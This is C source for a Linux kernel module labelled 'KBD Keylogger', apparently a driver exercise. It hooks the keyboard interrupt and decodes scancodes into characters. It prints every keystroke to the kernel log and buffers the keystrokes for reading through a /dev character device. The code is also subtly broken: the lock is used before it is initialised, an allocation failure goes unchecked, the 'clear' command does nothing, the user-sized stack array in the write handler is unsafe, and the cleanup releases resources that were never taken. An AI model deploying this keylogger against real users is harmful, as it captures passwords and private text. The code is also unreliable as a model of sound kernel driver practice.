#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <asm/io.h>
#include <linux/uaccess.h>
#include <linux/ioport.h>
#include <linux/interrupt.h>
#include <linux/spinlock.h>
#include <linux/kfifo.h>
#include <linux/slab.h>

MODULE_DESCRIPTION("KBD Keylogger");
MODULE_AUTHOR("Kernel Hacker");
MODULE_LICENSE("GPL");

#define MODULE_NAME     "kbd"
#define KBD_MAJOR       42
#define KBD_MINOR       0
#define KBD_NR_MINORS   1
#define I8042_KBD_IRQ   1
#define I8042_STATUS_REG 0x64
#define I8042_DATA_REG   0x60
#define SCANCODE_RELEASED_MASK 0x80
#define FIFO_SIZE       1024  // Must be power of 2

struct kbd {
    struct cdev cdev;
    spinlock_t lock;
    struct kfifo fifo;
};

static struct kbd devs[1];

static int is_key_press(unsigned int scancode)
{
    return !(scancode & SCANCODE_RELEASED_MASK);
}

static int get_ascii(unsigned int scancode)
{
    static char *row1 = "1234567890";
    static char *row2 = "qwertyuiop";
    static char *row3 = "asdfghjkl";
    static char *row4 = "zxcvbnm";

    scancode &= ~SCANCODE_RELEASED_MASK;
    if (scancode >= 0x02 && scancode <= 0x0b)
        return *(row1 + scancode - 0x02);
    if (scancode >= 0x10 && scancode <= 0x19)
        return *(row2 + scancode - 0x10);
    if (scancode >= 0x1e && scancode <= 0x26)
        return *(row3 + scancode - 0x1e);
    if (scancode >= 0x2c && scancode <= 0x32)
        return *(row4 + scancode - 0x2c);
    if (scancode == 0x39)
        return ' ';
    if (scancode == 0x1c)
        return '\n';
    return '?';
}



static inline u8 i8042_read_data(void)
{
    return inb(I8042_DATA_REG);
}

static irqreturn_t kbd_interrupt_handler(int irq, void *dev_id)
{
    struct kbd *data = (struct kbd *)dev_id;
    u8 scancode;
    int pressed;
    char ch;
    unsigned long flags;

    scancode = i8042_read_data();
    pressed = is_key_press(scancode);
    ch = get_ascii(scancode);

    pr_info("IRQ %d: scancode=0x%x (%u) pressed=%d ch=%c\n",
            irq, scancode, scancode, pressed, ch);

    if (pressed && ch != '?') {
        spin_lock_irqsave(&data->lock, flags);
        if (!kfifo_is_full(&data->fifo)) {
            kfifo_put(&data->fifo, ch);
        } else {
            pr_warn("FIFO full, dropping keypress\n");
        }
        spin_unlock_irqrestore(&data->lock, flags);
    }

    return IRQ_NONE;
}

static int kbd_open(struct inode *inode, struct file *file)
{
    struct kbd *data = container_of(inode->i_cdev, struct kbd, cdev);
    file->private_data = data;
    pr_info("%s opened\n", MODULE_NAME);
    return 0;
}

static int kbd_release(struct inode *inode, struct file *file)
{
    pr_info("%s closed\n", MODULE_NAME);
    return 0;
}

static ssize_t kbd_read(struct file *file, char __user *user_buffer,
                        size_t size, loff_t *offset)
{
    struct kbd *data = (struct kbd *)file->private_data;
    unsigned long flags;
    int copied;
    char *tmp_buf;

    tmp_buf = kmalloc(size, GFP_KERNEL);
    if (!tmp_buf)
        return -ENOMEM;

    spin_lock_irqsave(&data->lock, flags);
    copied = kfifo_out(&data->fifo, tmp_buf, size);
    spin_unlock_irqrestore(&data->lock, flags);

    if (copied == 0) {
        kfree(tmp_buf);
        return 0;
    }

    if (copy_to_user(user_buffer, tmp_buf, copied))
        copied = -EFAULT;

    kfree(tmp_buf);
    return copied;
}

static ssize_t kbd_write(struct file *file, const char __user *user_buffer,
                         size_t size, loff_t *offset)
{
    struct kbd *data = (struct kbd *)file->private_data;
    char cmd[size];
    int err;

    //only care about the "clear" command
    if (size < 5)
        return -EINVAL;

    // Copy user data
    err = copy_from_user(cmd, user_buffer, size);
    if (err)
        return -EFAULT;

    // Remove trailing newline if present
    if (size > 0 && cmd[size-1] == '\n')
        cmd[size-1] = '\0';

    if (strncmp(cmd, "clear", 5) == 0) {

        pr_info("Buffer cleared\n");
        return size;
    }

    return -EINVAL;
}

static const struct file_operations kbd_fops = {
    .owner = THIS_MODULE,
    .open = kbd_open,
    .release = kbd_release,
    .read = kbd_read,
    .write = kbd_write,
};

static int kbd_init(void)
{
    int err;
    unsigned long flags;
    const char *init_str = "kien\n";
    int i;

    err = register_chrdev_region(MKDEV(KBD_MAJOR, KBD_MINOR),
                                KBD_NR_MINORS, MODULE_NAME);
    if (err) {
        pr_err("register_region failed: %d\n", err);
        goto out;
    }



    err = kfifo_alloc(&devs[0].fifo, FIFO_SIZE, GFP_KERNEL);

    spin_lock_irqsave(&devs[0].lock, flags);
    for (i = 0; i < strlen(init_str); i++) {
        if (kfifo_is_full(&devs[0].fifo)) {
            pr_warn("FIFO full during initialization\n");
            break;
        }
        kfifo_put(&devs[0].fifo, init_str[i]);
    }
    spin_unlock_irqrestore(&devs[0].lock, flags);


    if (err) {
        pr_err("kfifo_alloc failed\n");
        goto out_release_status;
    }

    spin_lock_init(&devs[0].lock);

    err = request_irq(I8042_KBD_IRQ, kbd_interrupt_handler,
                     IRQF_SHARED, MODULE_NAME, &devs[0]);
    if (err) {
        pr_err("Failed to request IRQ %d\n", I8042_KBD_IRQ);
        goto out_free_fifo;
    }

    cdev_init(&devs[0].cdev, &kbd_fops);
    cdev_add(&devs[0].cdev, MKDEV(KBD_MAJOR, KBD_MINOR), 1);

    pr_notice("Driver %s loaded\n", MODULE_NAME);
    return 0;

out_free_fifo:
    kfifo_free(&devs[0].fifo);
out_release_status:
    release_region(I8042_STATUS_REG, 1);
out_release_data:
    release_region(I8042_DATA_REG, 1);
out_unregister:
    unregister_chrdev_region(MKDEV(KBD_MAJOR, KBD_MINOR), KBD_NR_MINORS);
out:
    return err;
}

static void kbd_exit(void)
{
    cdev_del(&devs[0].cdev);
    free_irq(I8042_KBD_IRQ, &devs[0]);
    kfifo_free(&devs[0].fifo);
    release_region(I8042_STATUS_REG, 1);
    release_region(I8042_DATA_REG, 1);
    unregister_chrdev_region(MKDEV(KBD_MAJOR, KBD_MINOR), KBD_NR_MINORS);
    pr_notice("Driver %s unloaded\n", MODULE_NAME);
}

module_init(kbd_init);
module_exit(kbd_exit);